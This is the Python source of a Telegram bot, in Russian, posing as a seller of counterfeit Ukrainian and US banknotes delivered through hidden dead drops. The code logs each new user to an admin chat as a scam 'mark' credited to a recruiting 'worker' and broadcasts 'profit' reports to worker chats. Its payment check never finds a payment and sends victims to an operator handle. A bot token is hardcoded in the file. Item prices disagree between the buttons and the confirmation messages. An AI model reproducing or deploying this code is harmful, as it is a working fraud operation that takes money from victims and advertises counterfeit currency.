# -*- coding: utf8 -*-
import telebot
import config
import time


bot = telebot.TeleBot('5613206082:AAFFv32UFqD0dpxYXQj_kLiM2UNIEGk-VH0')

viplaty_id = ' -176097'
admin_chat = ' -294098'
worcer_chat = ' -100098'

admin_id = [5142288376]


menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('Купить 💸')
menu.row('Информация ✍🏻', 'Помощь ⚙️')
tovar = telebot.types.InlineKeyboardMarkup()
one = telebot.types.InlineKeyboardButton(text='А ВАСЯ ХОЧЕ НА 500', callback_data='tovar1')
two = telebot.types.InlineKeyboardButton(text='1000 UAH  - Цена: 450 UAH ', callback_data='tovar2')
three = telebot.types.InlineKeyboardButton(text='5.000 UAH - Цена: 2.500 UAH ', callback_data='tovar3')
four = telebot.types.InlineKeyboardButton(text='10.000 UAH  - Цена: 5.500 UAH ', callback_data='tovar4')
five = telebot.types.InlineKeyboardButton(text='100 USD - Цена: 3.000 UAH', callback_data='tovar5')
six = telebot.types.InlineKeyboardButton(text='200 USD - Цена: 4.500 UAH', callback_data='tovar6')
seven = telebot.types.InlineKeyboardButton(text='300 USD - Цена: 4.300 UAH', callback_data='tovar7')
eight = telebot.types.InlineKeyboardButton(text='500 USD - Цена: 10.000 UAH', callback_data='tovar8')
nine = telebot.types.InlineKeyboardButton(text='1.000 USD - Цена: 25.000 UAH', callback_data='tovar9')
tovar.add(one)
tovar.add(two)
tovar.add(three)
tovar.add(four)
tovar.add(five)
tovar.add(six)
tovar.add(seven)
tovar.add(eight)
tovar.add(nine)

oplata = telebot.types.InlineKeyboardMarkup()
checkpay = telebot.types.InlineKeyboardButton(text='Я оплатил', callback_data='paymentcheck')
oplata.add(checkpay)


@bot.message_handler(commands=['start'])
def wlcms(message):
    try:
        bot.send_message(admin_chat, f'Новый мамонт:\nВоркер: {message.text.split()[1]}\nМамонт: @{message.from_user.username} ({message.chat.id})')
        bot.send_message(message.chat.id, '<i>Привет, тут можно купить фальшивые деньги в большом количестве которые принимает почти все банкоматы!</i>', parse_mode='html', reply_markup=menu)
    except:
        bot.send_message(message.chat.id, '<i>Привет, тут можно купить фальшивые деньги в большом количестве которые принимает почти все банкоматы!</i>', parse_mode='html', reply_markup=menu)

@bot.message_handler(content_types=['text'])
def perdun(message):
    if message.text == 'Купить 💸':
        bot.send_message(message.chat.id, '<i>💰 Для продажи доступно:</i>', reply_markup=tovar, parse_mode='html')
    elif message.text == 'Информация ✍🏻':
        bot.send_message(message.chat.id, '<i>✅ Мы работаем более чем по 50 городам Украини ✅\n\n1. Клады делаются на магнитах в городской черте, в пешей доступности от метро или крупных транспортных узлов.Закапываются в случае, если делаются в лесу или парке.\n2. Более 1 перезаклада не выдается.\n\nВ случае если вы не нашли клад с деньгами:\n\n1. Если у вас какая-либо  проблема с нахождением клада, то обязательно сделайте 2 фото местности: со стороны и место где должен был располагаться клад, если не сделали - придется ехать еще раз. Пересмотрите выкопанную земли, возможны вы не заметили клад, откинув его вместе с землей и листвой.\n2. Напишите оператору поддержки в Telegram:@karamelkapi\n3. Если повторные поиски не помогли, тогда администратором будет рассматриваться вопрос о перезакладе.\n4. Перезаклад выдается в случае только фото и видео доказательств. И курьер сам приедет разбираться.</i>', parse_mode='html')                                                                                      
    elif message.text == 'Помощь ⚙️':
        bot.send_message(message.chat.id, '<i>По всем вопросам писать: @karamelkapi</i>', parse_mode='html')
    elif '/profit' in message.text and message.chat.id in admin_id:
        try:
            bot.send_message(viplaty_id, f'🥳 Успешный профит \n\nВоркер: {message.text.split()[1]} \nСумма: {message.text.split()[2]} UAH')
            bot.send_message(worcer_chat, f'🥳 Успешный профит \n\nВоркер: {message.text.split()[1]} \nСумма: {message.text.split()[2]} UAH')
            bot.send_message(message.chat.id, 'Залет успешно отправлен!')
        except:
            bot.send_message(message.chat.id, 'Упс.. Что-то не так')


    
    
@bot.callback_query_handler(func=lambda call:True)
def call_answer(call):
    if call.data == 'tovar1':
        bot.send_message(call.message.chat.id, f'<b>ВАСЯ НА:</b> 500 UHA - НИМА ЕСТЬ НА: 1000UAH\n<b>Стоимость товара:</b> 1000 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>После перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar2':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 1000 UHA - Цена: 450UAH\n<b>Стоимость товара:</b> 450 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar3':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 2.500 UHA - Цена: 1.000UAH\n<b>Стоимость товара:</b> 1.000 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar4':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 5.000 UHA - Цена: 2.500UAH\n<b>Стоимость товара:</b> 2.500 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar5':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 100 USD - Цена: 2.800UAH\n<b>Стоимость товара:</b> 2.800 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>После перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar6':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 200 USD - Цена: 3.800UAH\n<b>Стоимость товара:</b> 3.800 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar7':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 300 USD - Цена: 4.300UAH\n<b>Стоимость товара:</b> 4.300 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar8':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 500 USD - Цена: 10.000UAH\n<b>Стоимость товара:</b> 10.000 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>осле перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'tovar9':
        bot.send_message(call.message.chat.id, f'<b>Вы выбрали:</b> 1000 USD - Цена: 25.000UAH\n<b>Стоимость товара:</b> 25.000 UHA \n<b>Оплатить можно тут :</b> <a href="https://bitobmen.pro/ru/ua/">Bitobmen</a>\n➖➖➖➖➖➖➖➖➖➖➖➖\n<b>После перевода, нажмите кнопку и ведите код оплаты ниже и бот в течение 30 минут отправит вам координаты где запрятан клад!</b>', reply_markup=oplata, parse_mode='html')
    if call.data == 'paymentcheck':
        bot.send_message(call.message.chat.id, '<i>⚙️ Ищем ваш платеж ♻️</i>', parse_mode='html')
        time.sleep(30)
        bot.send_message(call.message.chat.id, '<i>Платеж не найден ❗️Свяжитесь с Администрацией @karamelkapi </i>', parse_mode='html')
    
    
bot.polling(none_stop=True)
